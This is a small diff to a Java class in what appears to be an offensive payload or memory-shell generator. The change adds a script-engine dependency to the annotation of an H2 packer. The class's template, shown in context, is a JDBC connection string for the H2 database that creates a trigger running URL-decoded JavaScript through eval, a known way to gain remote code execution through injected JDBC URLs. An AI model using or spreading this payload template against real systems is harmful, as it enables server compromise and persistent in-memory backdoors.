@@ -7,7 +7,7 @@ import org.leo.jmg.mem.packer.PackerRegistry;
 
 import java.net.URLEncoder;
 
-@PackerMeta(name = "H2JSURLEncode", group = "H2", order = 3)
+@PackerMeta(name = "H2JSURLEncode", group = "H2", order = 3, dependencies = "DefaultScriptEngine")
 public class H2JSURLEncodePacker implements Packer {
     String template = "jdbc:h2:mem:a;init=CREATE TRIGGER a BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\neval(decodeURIComponent('{{script}}'))$$";
 
